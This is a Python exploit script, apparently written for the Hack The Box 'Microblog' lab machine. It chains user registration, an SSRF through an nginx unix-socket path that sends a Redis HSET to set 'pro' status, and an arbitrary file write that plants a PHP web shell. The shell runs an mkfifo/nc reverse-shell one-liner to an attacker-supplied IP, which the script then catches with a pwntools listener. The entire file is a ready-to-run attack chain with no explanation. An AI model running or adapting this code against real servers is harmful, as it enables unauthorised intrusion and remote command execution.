#!/usr/bin/python3

import threading
from pwn import *
import requests
from loguru import logger
from time import sleep
import sys

def random_string(length: int = 8, charset: str = string.ascii_lowercase) -> str:
    return "".join(random.choices(charset, k=length))

def register_user(s: requests.Session, username):
    logger.info("Registering user")
    sleep(1)

    url = "http://app.microblog.htb:80/register/index.php"
    data = {"first-name": f"{username}", "last-name": f"{username}", "username": f"{username}", "password": f"{username}"}
    response = s.post(url, data=data)

    if response.status_code != 200:
        logger.error(f"Failed to register user [{response.text}]")
        exit()
    else:
        logger.success(f"User [{username}] registered successfully")
        return username
    
def create_blog(s: requests.Session, username):
    logger.info("Creating blog")
    sleep(1)
    url = "http://app.microblog.htb:80/dashboard/index.php"

    data = {"new-blog-name": f"{username}"}
    response = s.post(url, data=data)

    if response.status_code != 200:
        logger.error(f"Failed to create a blog [{response.text}]")
        exit()
    else:
        logger.success(f"Blog [{username}] created successfully")

def set_user_as_pro(s: requests.Session, username):
    logger.info("Setting user as PRO user")
    sleep(1)
    unix_socket_url = f"http://microblog.htb/static/unix:/var/run/redis/redis.sock:{username}%20pro%20true%20/pwn"
    response = requests.request("HSET", unix_socket_url)
    
    if response.status_code != 502:
        logger.error(f"Failed to communicate with redis socket [{response.text}]")
        exit()
    else:
        logger.success("Redis socket tickling, successful")
        sleep(1)
        logger.info(f"Accessing /edit/index.php so /uploads folder is created before next phase for user [{username}]")
        sleep(1)
        
        url = "http://microblog.htb:80/edit/index.php"
        headers = {"Host": f"{username}.microblog.htb"}
        response = s.get(url, headers=headers)
        if response.status_code != 200:
            logger.error(f"Failed to access /edit/index.php after payload creation. This is not ideal. [{response.text}]")
            exit()
        else:
            logger.success("Successfully accessed /edit/index.php. Uploads folder should be ready for us now.")

def write_payload(s: requests.Session, blog_name, ip, port):
    logger.info(f"Writing payload to [{blog_name}]")
    sleep(1)
    url = "http://microblog.htb:80/edit/index.php"
    headers = {"Host": f"{blog_name}.microblog.htb"}

    file_to_write_to = f"/var/www/microblog/{blog_name}/uploads/shell.php"
    bomb = f'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")'
    payload = f"<?php {bomb} ?>"

    data = {"id": file_to_write_to, "header": payload}
    response = s.post(url, headers=headers, data=data, allow_redirects=False)
    
    if response.status_code != 200 and response.status_code != 302:
        logger.error(f"Payload writing failed [{response.text}]")
        exit()
    else:
        logger.success("Successfully wrote payload!")

def initiate_call_back(port):
    logger.info("Starting reverse shell listener in 4..3..2..1")
    sleep(1)
    loc_p = int(port)
    l = listen(loc_p)
    conn = l.wait_for_connection()
    conn.interactive()

def start_callback_server(port):
    t = threading.Thread(target=initiate_call_back, args=(port,))
    t.start()

def call_reverse_shell(blog_name):
    sleep(4)
    url = "http://microblog.htb/uploads/shell.php"
    headers = {"Host": f"{blog_name}.microblog.htb"}
    requests.get(url, headers=headers)




if len(sys.argv) < 3:
    print("Please provide a local ip and local port number for a callback")
    print(f"Usage: {sys.argv[0]} <local listener ip> <local listener port>")
    exit()


session = requests.Session()
ip = sys.argv[1]
port = sys.argv[2]
username = random_string()

register_user(session, username)
create_blog(session, username)
set_user_as_pro(session, username)
write_payload(session, username, ip, port)
start_callback_server(port)
call_reverse_shell(username)